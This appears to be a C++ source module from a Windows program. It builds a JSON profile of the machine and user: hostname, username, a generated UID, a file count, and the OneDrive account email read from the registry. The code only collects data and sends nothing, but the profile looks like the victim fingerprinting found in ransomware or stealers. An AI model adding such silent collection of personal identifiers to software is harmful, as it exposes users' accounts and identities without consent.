#include "profiler.h"
#include <windows.h>
#include <map>
#include <string>


std::string get_email() {
    // Define a handle for the registry key:
    HKEY hKey;
    // Path to the OneDrive account info in the Windows registry:
    const char* regPath = "SOFTWARE\\Microsoft\\OneDrive\\Accounts\\Personal";
    // Buffer to hold the user email address:
    char userEmailAddr[256];

    // Variable to hold the size of userEmailAddr buffer:
    DWORD userEmailAddrSize = sizeof(userEmailAddr);
    // Attempt to open the registry key:
    long lResult = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_READ, &hKey);

    // Check if the key was opened successfully:
    if (lResult == ERROR_SUCCESS) {
        // Query the registry to get the "UserEmail" value:
        lResult = RegQueryValueExA(hKey, "UserEmail", NULL, NULL, (LPBYTE)userEmailAddr, &userEmailAddrSize);
        // Close the opened registry key:
        RegCloseKey(hKey);
        // Check if the email value was retrieved successfully:
        if (lResult == ERROR_SUCCESS) {
            return std::string(userEmailAddr);
        }
    }
    return "";
}




nlohmann::json profiler(std::string filesCount) {
    std::map<std::string, std::string> profile;
    char buffer[256];
    DWORD size = 256;

    // Get hostname
    if (GetComputerNameA(buffer, &size)) {
        profile["hostname"] = buffer;
    }

    // Get username
    size = 256;
    if (GetUserNameA(buffer, &size)) {
        profile["username"] = buffer;
    }

    // Get UID
    profile["uid"] = gen_uid();


    // Get email
    profile["email"] = get_email();

    // Get total file count
    profile["files"] = filesCount;

    // Convert the map to JSON and return it
    nlohmann::json jsonProfile = profile;
    return jsonProfile;
}


